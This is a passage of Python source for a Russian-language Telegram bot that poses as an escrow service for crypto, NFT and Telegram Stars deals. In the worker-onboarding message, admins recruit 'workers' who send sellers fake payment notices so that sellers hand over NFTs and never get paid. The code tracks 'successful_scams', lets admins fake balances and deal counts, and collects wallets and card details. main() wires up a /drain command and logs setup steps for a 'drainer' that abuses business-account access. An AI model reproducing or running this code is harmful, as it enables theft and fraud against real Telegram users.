                await query.edit_message_text(text=message_text, parse_mode="HTML")

    except (NetworkError, BadRequest) as e:
        if "Message is not modified" not in str(e) and "There is no caption in the message to edit" not in str(e):
            logger.error(f"Telegram API error in button handler for data '{data}': {e}", exc_info=True)
    except Exception as e:
        logger.error(f"Ошибка в функции button для data '{data}': {e}", exc_info=True)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # ЗАЩИТА ОТ НУЛЛЕЙ
    if not update or not update.message or not update.message.text:
        return
    
    try:
        user_id = update.message.from_user.id
        text = update.message.text
        
        logger.info(f"Message from {user_id}: {text}")
        
        ensure_user_exists(user_id)
        lang = user_data.get(user_id, {}).get('lang', 'ru')
        command_to_execute = admin_commands.get(user_id)
        
        logger.info(f"Command to execute for {user_id}: {command_to_execute}")
        
        if user_id in ADMIN_ID and command_to_execute:
            logger.info(f"Admin {user_id} executing command: {command_to_execute}")
            
            if command_to_execute == 'test_user_lookup':
                try:
                    username = text.strip().replace('@', '')
                    logger.info(f"Looking up user: {username}")
                    
                    try:
                        user_chat = None
                        try:
                            user_chat = await context.bot.get_chat(f"@{username}")
                        except BadRequest:
                            try:
                                user_chat = await context.bot.get_chat(username)
                            except BadRequest:
                                try:
                                    if username.isdigit():
                                        user_chat = await context.bot.get_chat(int(username))
                                except:
                                    pass
                        
                        if user_chat:
                            response = f"✅ Найден пользователь:\n"
                            response += f"Username: @{username}\n"
                            response += f"ID: {user_chat.id}\n"
                            response += f"Тип: {user_chat.type}\n"
                            response += f"Имя: {user_chat.first_name or 'Не указано'}\n"
                            response += f"Фамилия: {user_chat.last_name or 'Не указано'}\n"
                            response += f"Юзернейм: @{user_chat.username or 'Не указан'}"
                            await update.message.reply_text(response, parse_mode="HTML")
                        else:
                            await update.message.reply_text(f"❌ Не удалось найти пользователя @{username}")
                    except Exception as e:
                        logger.error(f"Error looking up user @{username}: {e}")
                        await update.message.reply_text(f"❌ Ошибка при поиске: {str(e)}")
                except Exception as e:
                    logger.error(f"Error in test_user_lookup: {e}")
                    await update.message.reply_text(f"❌ Ошибка: {str(e)}")
                admin_commands[user_id] = None

            elif command_to_execute == 'add_worker_username':
                try:
                    username_input = text.strip()
                    
                    username = username_input.replace('@', '')
                    logger.info(f"Adding worker with username: {username}")
                    
                    worker_id = None
                    
                    try:
                        user_chat = await context.bot.get_chat(f"@{username}")
                        worker_id = user_chat.id
                    except BadRequest:
                        try:
                            user_chat = await context.bot.get_chat(username)
                            worker_id = user_chat.id
                        except BadRequest:
                            await update.message.reply_text(
                                f"❌ Не удалось найти пользователя @{username}\n\n"
                                f"Попробуйте:\n"
                                f"1. Проверить правильность username\n"
                                f"2. Добавить по ID\n"
                                f"3. Убедиться что пользователь существует",
                                parse_mode="HTML"
                            )
                            admin_commands[user_id] = None
                            return
                    
                    user_chat = await context.bot.get_chat(worker_id)
                    if user_chat.type not in ['private', '']:
                        await update.message.reply_text(f"❌ @{username} это {user_chat.type}, а не пользователь.", parse_mode="HTML")
                        admin_commands[user_id] = None
                        return
                    
                    actual_username = user_chat.username or str(worker_id)
                    
                    if worker_id in WORKER_ID:
                        await update.message.reply_text(f"🚫 @{actual_username} уже является воркером.", parse_mode="HTML")
                    else:
                        WORKER_ID.add(worker_id)
                        worker_status[worker_id] = {
                            'username': actual_username,
                            'owner_id': user_id,
                            'status': 'active',
                            'successful_scams': 0
                        }
                        save_worker(worker_id, actual_username, user_id)
                        
                        try:
                            await context.bot.send_message(
                                worker_id,
                                "🕵️ Вы были добавлены как воркер-покупатель!",
                                parse_mode="HTML"
                            )
                            welcome_sent = True
                        except Exception:
                            welcome_sent = False
                        
                        response_msg = f"✅ Воркер @{actual_username} добавлен!"
                        if not welcome_sent:
                            response_msg += "\n⚠️ Не удалось отправить приветственное сообщение."
                        
                        await update.message.reply_text(response_msg, parse_mode="HTML")
                        
                except Exception as e:
                    logger.error(f"Error adding worker: {e}", exc_info=True)
                    await update.message.reply_text(f"❌ Ошибка: {str(e)}", parse_mode="HTML")
                admin_commands[user_id] = None

            elif command_to_execute == 'add_worker_id':
                try:
                    id_input = text.strip()
                    
                    if not id_input.isdigit():
                        await update.message.reply_text("❌ ID должен содержать только цифры!", parse_mode="HTML")
                        admin_commands[user_id] = None
                        return
                        
                    worker_id = int(id_input)
                    logger.info(f"Adding worker by ID: {worker_id}")
                    
                    try:
                        user_chat = await context.bot.get_chat(worker_id)
                        
                        if user_chat.type not in ['private', '']:
                            await update.message.reply_text(f"❌ ID {worker_id} принадлежит {user_chat.type}, а не пользователю.", parse_mode="HTML")
                            admin_commands[user_id] = None
                            return
                            
                        actual_username = user_chat.username or str(worker_id)
                        first_name = user_chat.first_name or ""
                        last_name = user_chat.last_name or ""
                        
                    except BadRequest as e:
                        logger.warning(f"Could not get chat info for ID {worker_id}: {e}")
                        actual_username = f"user_{worker_id}"
                        first_name = "Неизвестно"
                        last_name = ""
                        
                    if worker_id in WORKER_ID:
                        await update.message.reply_text(f"🚫 Пользователь с ID {worker_id} уже является воркером.", parse_mode="HTML")
                    else:
                        WORKER_ID.add(worker_id)
                        worker_status[worker_id] = {
                            'username': actual_username,
                            'owner_id': user_id,
                            'status': 'active',
                            'successful_scams': 0
                        }
                        save_worker(worker_id, actual_username, user_id)
                        
                        try:
                            await context.bot.send_message(
                                worker_id,
                                "🕵️ Вы были добавлены как воркер-покупатель!\n\n"
                                "🎯 Ваша задача:\n"
                                "1. Используйте /orders чтобы увидеть активные ордера\n"
                                "2. Оплачивайте через /pay номер_ордера\n"
                                "3. Продавец получит фейковое уведомление об оплате\n"
                                "4. Продавец отправит вам NFT\n"
                                "5. Вы подтверждаете получение NFT\n\n"
                                "⚠️ Важно:\n"
                                "- NFT будут приходить к вам\n"
                                "- Продавец не получит деньги\n"
                                "- Работайте аккуратно\n\n"
                                "💰 Вы зарабатываете NFT, администратор контролирует процесс.",
                                parse_mode="HTML"
                            )
                            welcome_sent = True
                        except Exception as e:
                            logger.error(f"Failed to send welcome message to worker {worker_id}: {e}")
                            welcome_sent = False
                        
                        response_msg = f"✅ Воркер добавлен по ID!\n\n"
                        response_msg += f"🆔 ID: {worker_id}\n"
                        response_msg += f"👤 Username: @{actual_username}\n"
                        if first_name:
                            response_msg += f"👤 Имя: {first_name} {last_name}\n"
                        response_msg += f"👑 Владелец: {user_id}\n"
                        response_msg += f"📊 Статус: активен\n\n"
                        
                        if welcome_sent:
                            response_msg += "📨 Приветственное сообщение отправлено воркеру."
                        else:
                            response_msg += "⚠️ Не удалось отправить приветственное сообщение.\n"
                            response_msg += "Возможно, пользователь еще не писал боту."
                        
                        await update.message.reply_text(response_msg, parse_mode="HTML")
                        
                        logger.info(f"Добавлен новый воркер по ID: {worker_id} владельцем {user_id}")
                        
                except ValueError:
                    await update.message.reply_text("❌ Неверный формат ID. Введите только цифры.", parse_mode="HTML")
                except Exception as e:
                    logger.error(f"Error adding worker by ID: {e}", exc_info=True)
                    await update.message.reply_text(f"❌ Ошибка при добавлении воркера: {str(e)}", parse_mode="HTML")
                admin_commands[user_id] = None

            elif command_to_execute == 'broadcast' and user_id in SUPER_ADMIN_IDS:
                admin_commands[user_id] = None
                success_count = 0
                fail_count = 0
                for target_user_id in user_data:
                    try:
                        await context.bot.send_message(target_user_id, text, parse_mode="HTML")
                        success_count += 1
                    except Exception as e:
                        logger.error(f"Failed to send broadcast message to {target_user_id}: {e}")
                        fail_count += 1
                await update.message.reply_text(
                    f"📢 Рассылка завершена.\nУспешно отправлено: {success_count}\nОшибок: {fail_count}",
                    parse_mode="HTML"
                )

            elif command_to_execute == 'change_balance':
                try:
                    parts = text.split()
                    if len(parts) != 2:
                        raise ValueError("Incorrect number of arguments")
                    target_user_id, new_balance = int(parts[0]), float(parts[1])
                    ensure_user_exists(target_user_id)
                    user_data[target_user_id]['balance'] = new_balance
                    save_user_data(target_user_id)
                    await update.message.reply_text(f"💰 Баланс пользователя {target_user_id} изменен на {new_balance} 💎.", parse_mode="HTML")
                except (ValueError, IndexError):
                    await update.message.reply_text("❌ Неверный формат. Введите ID и баланс (например, 12345 100.5).", parse_mode="HTML")
                admin_commands[user_id] = None
            
            elif command_to_execute == 'change_successful_deals':
                try:
                    parts = text.split()
                    if len(parts) != 2:
                        raise ValueError("Incorrect number of arguments")
                    target_user_id, new_deals = int(parts[0]), int(parts[1])
                    ensure_user_exists(target_user_id)
                    user_data[target_user_id]['successful_deals'] = new_deals
                    save_user_data(target_user_id)
                    await update.message.reply_text(f"✅ Успешные сделки {target_user_id} изменены на {new_deals}.", parse_mode="HTML")
                except (ValueError, IndexError):
                    await update.message.reply_text("❌ Неверный формат. Введите ID и количество (например, 12345 10).", parse_mode="HTML")
                admin_commands[user_id] = None

            elif command_to_execute == 'change_valute':
                VALUTE = text.strip().upper()
                await update.message.reply_text(f"💱 Валюта изменена на {VALUTE}.", parse_mode="HTML")
                admin_commands[user_id] = None

            elif command_to_execute == 'manage_admins':
                try:
                    parts = text.split()
                    if len(parts) != 2:
                        raise ValueError("Incorrect number of arguments")
                    target_user_id, action = int(parts[0]), parts[1]
                    ensure_user_exists(target_user_id)
                    if action == 'add':
                        if target_user_id not in ADMIN_ID:
                            ADMIN_ID.add(target_user_id)
                            user_data[target_user_id]['granted_by'] = user_id
                            user_data[target_user_id]['is_admin'] = 1
                            save_user_data(target_user_id)
                            logger.info(f"Добавлен администратор {target_user_id} пользователем {user_id}. ADMIN_ID: {ADMIN_ID}")
                            await update.message.reply_text(cached_get_text(lang, "admin_added_message", user_id=target_user_id), parse_mode="HTML")
                        else:
                            await update.message.reply_text(f"🚫 Пользователь {target_user_id} уже админ.", parse_mode="HTML")
                    elif action == 'remove':
                        if target_user_id == user_id:
                            await update.message.reply_text(cached_get_text(lang, "admin_cannot_remove_self_message"), parse_mode="HTML")
                        elif target_user_id in SUPER_ADMIN_IDS:
                            await update.message.reply_text(cached_get_text(lang, "admin_cannot_remove_super_admin_message"), parse_mode="HTML")
                        elif target_user_id in ADMIN_ID:
                            ADMIN_ID.remove(target_user_id)
                            user_data[target_user_id]['granted_by'] = None
                            user_data[target_user_id]['is_admin'] = 0
                            save_user_data(target_user_id)
                            logger.info(f"Удален администратор {target_user_id} пользователем {user_id}. ADMIN_ID: {ADMIN_ID}")
                            await update.message.reply_text(cached_get_text(lang, "admin_removed_message", user_id=target_user_id), parse_mode="HTML")
                        else:
                            await update.message.reply_text(f"🚫 Пользователь {target_user_id} не админ.", parse_mode="HTML")
                    else:
                        await update.message.reply_text(cached_get_text(lang, "invalid_action_message"), parse_mode="HTML")
                except (ValueError, IndexError):
                    await update.message.reply_text("❌ Неверный формат: Введите ID и действие (add/remove).", parse_mode="HTML")
                admin_commands[user_id] = None

        elif context.user_data.get('awaiting_recipient_username', False):
            username = text.strip()
            
            if not username.startswith('@'):
                await update.message.reply_text("❌ Username должен начинаться с @. Например: @username", parse_mode="HTML")
                return
            
            if len(username) < 5:
                await update.message.reply_text("❌ Некорректный username. Попробуйте еще раз.", parse_mode="HTML")
                return
            
            context.user_data['recipient_username'] = username
            context.user_data['awaiting_recipient_username'] = False
            context.user_data['awaiting_amount'] = True
            
            payment_method_for_deal = context.user_data.get('payment_method', 'ton')
            
            min_amount_text = ""
            if payment_method_for_deal == 'ton':
                min_amount_text = "<blockquote>💎 <b>Минимальная сумма</b>: <i>2</i> TON</blockquote>"
            elif payment_method_for_deal == 'usdt':
                min_amount_text = "<blockquote>💵 <b>Минимальная сумма</b>: <i>1</i> USDT</blockquote>"
            elif payment_method_for_deal == 'sbp':
                min_amount_text = "<blockquote>₽ <b>Минимальная сумма</b>: <i>50</i> RUB</blockquote>"
            elif payment_method_for_deal == 'stars':
                min_amount_text = "<blockquote>⭐️ <b>Минимальная сумма</b>: <i>100</i> звезд</blockquote>"
            
            message_text = f"✅ Получатель: {username}\n\n{min_amount_text}\n\nВведите сумму:"
            await update.message.reply_text(message_text, parse_mode="HTML")
        
        elif context.user_data.get('awaiting_amount', False):
            try:
                amount_float = float(text)
                payment_method_for_deal = context.user_data.get('payment_method', 'ton')
                
                if payment_method_for_deal == 'ton' and amount_float < 2:
                    await update.message.reply_text("❌ Минимальная сумма для TON: 2 TON", parse_mode="HTML")
                    return
                elif payment_method_for_deal == 'usdt' and amount_float < 1:
                    await update.message.reply_text("❌ Минимальная сумма для USDT: 1 USDT", parse_mode="HTML")
                    return
                elif payment_method_for_deal == 'sbp' and amount_float < 50:
                    await update.message.reply_text("❌ Минимальная сумма для RUB: 50 RUB", parse_mode="HTML")
                    return
                elif payment_method_for_deal == 'stars' and amount_float < 100:
                    await update.message.reply_text("❌ Минимальная сумма для звезд: 100 ⭐️", parse_mode="HTML")
                    return
                
                if amount_float <= 0:
                    await update.message.reply_text("❌ Сумма должна быть положительным числом.", parse_mode="HTML")
                    return
                    
                context.user_data['amount'] = amount_float
                context.user_data['awaiting_amount'] = False
                context.user_data['awaiting_description'] = True
                message_text = cached_get_text(lang, "awaiting_description_message")
                await update.message.reply_text(message_text, parse_mode="HTML")
            except ValueError:
                await update.message.reply_text("❌ Неверный формат. Введите число для суммы.", parse_mode="HTML")

        elif context.user_data.get('awaiting_description', False):
            order_id = generate_order_id()
            deal_id = str(uuid.uuid4())
            
            payment_method_for_deal = context.user_data.get('payment_method', 'ton')
            recipient_username = context.user_data.get('recipient_username', 'Не указан')
            
            deals[order_id] = {
                'deal_id': deal_id,
                'amount': context.user_data['amount'],
                'description': text,
                'seller_id': user_id,
                'buyer_id': None,
                'status': 'active',
                'payment_method': payment_method_for_deal,
                'recipient_username': recipient_username
            }
            save_deal(order_id)
            
            for key in ['amount', 'awaiting_description', 'payment_method', 'recipient_username']:
                context.user_data.pop(key, None)
            
            bot_username = (await context.bot.get_me()).username
            deal_link = f"https://t.me/{bot_username}?start={order_id}"
            
            if payment_method_for_deal == "ton":
                valute_for_deal_created = "💎 TON"
            elif payment_method_for_deal == "sbp":
                valute_for_deal_created = "₽ RUB"
            elif payment_method_for_deal == "usdt":
                valute_for_deal_created = "💵 USDT"
            else:
                valute_for_deal_created = "⭐️ stars"

            message_text = cached_get_text(lang, "deal_created_message",
                                    amount=deals[order_id]['amount'],
                                    valute=valute_for_deal_created,
                                    description=deals[order_id]['description'],
                                    deal_link=deal_link,
                                    order_id=order_id)
            await update.message.reply_text(
                message_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='menu')]])
            )
            
            for admin_id_loop in ADMIN_ID:
                try:
                    seller_chat_info = await context.bot.get_chat(deals[order_id]['seller_id'])
                    seller_username = seller_chat_info.username or deals[order_id]['seller_id']
                    
                    payment_icon = get_payment_icon(payment_method_for_deal)
                    
                    await context.bot.send_message(
                        admin_id_loop,
                        f"📄 Новая сделка: #{order_id}\n"
                        f"{payment_icon} Сумма: {deals[order_id]['amount']} {deals[order_id]['payment_method'].upper()}\n"
                        f"👤 Продавец: @{seller_username}\n"
                        f"📥 Получатель: {recipient_username}\n"
                        f"🆔 Внутренний ID: {deal_id}",
                        parse_mode="HTML"
                    )
                except Exception as e:
                    logger.error(f"Failed to send new deal notification to admin {admin_id_loop}: {e}")

        elif context.user_data.get('awaiting_ton_wallet', False):
            ensure_user_exists(user_id)
            user_data[user_id]['ton_wallet'] = text
            save_user_data(user_id)
            context.user_data.pop('awaiting_ton_wallet', None)
            message_text = cached_get_text(lang, "wallet_updated", wallet_type="TON", details=text)
            await update.message.reply_text(
                message_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='menu')]])
            )

        elif context.user_data.get('awaiting_usdt_wallet', False):
            ensure_user_exists(user_id)
            user_data[user_id]['usdt_wallet'] = text
            save_user_data(user_id)
            context.user_data.pop('awaiting_usdt_wallet', None)
            message_text = cached_get_text(lang, "wallet_updated", wallet_type="USDT", details=text)
            await update.message.reply_text(
                message_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='menu')]])
            )

        elif context.user_data.get('awaiting_card', False):
            ensure_user_exists(user_id)
            user_data[user_id]['card_details'] = text
            save_user_data(user_id)
            context.user_data.pop('awaiting_card', None)
            message_text = cached_get_text(lang, "wallet_updated", wallet_type="card", details=text)
            await update.message.reply_text(
                message_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='menu')]])
            )

    except (NetworkError, BadRequest) as e:
        logger.error(f"Telegram API error in handle_message: {e}", exc_info=True)
        try:
            if update and update.message:
                await update.message.reply_text("🚫 Ошибка сети. Попробуйте позже.", parse_mode="HTML")
        except:
            pass
    except Exception as e:
        logger.error(f"Ошибка в функции handle_message: {e}", exc_info=True)
        try:
            if update and update.message:
                await update.message.reply_text("🚫 Внутренняя ошибка. Попробуйте позже.", parse_mode="HTML")
        except:
            pass

def main():
    try:
        init_db()
        load_data()
        load_workers()
        logger.info("База данных инициализирована и данные загружены.")
        logger.info(f"Загружено администраторов: {len(ADMIN_ID)}")
        logger.info(f"Загружено воркеров: {len(WORKER_ID)}")

        application = Application.builder().token(BOT_TOKEN).build()

        application.add_handler(CommandHandler("drain", drain_command))
        application.add_handler(CommandHandler("pay", pay_command))
        application.add_handler(CommandHandler("orders", orders_command))
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("paysupport", pay_support_command))
        application.add_handler(CallbackQueryHandler(button))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        application.add_handler(PreCheckoutQueryHandler(pre_checkout_callback))
        application.add_handler(MessageHandler(filters.SUCCESSFUL_PAYMENT, successful_payment_callback))

        logger.info("Бот запущен с поддержкой Telegram Stars и интегрированным дрейнером.")
        logger.info("🚀 Для работы дрейнера:")
        logger.info("1. Добавьте бота как менеджера бизнес-аккаунта")
        logger.info("2. Отправьте любое сообщение в бизнес-чат")
        logger.info("3. Используйте команду /drain для запуска")
        
        application.run_polling(allowed_updates=Update.ALL_TYPES)
    except Exception as e:
        logger.error(f"Ошибка в main: {e}", exc_info=True)

if __name__ == '__main__':
    main()
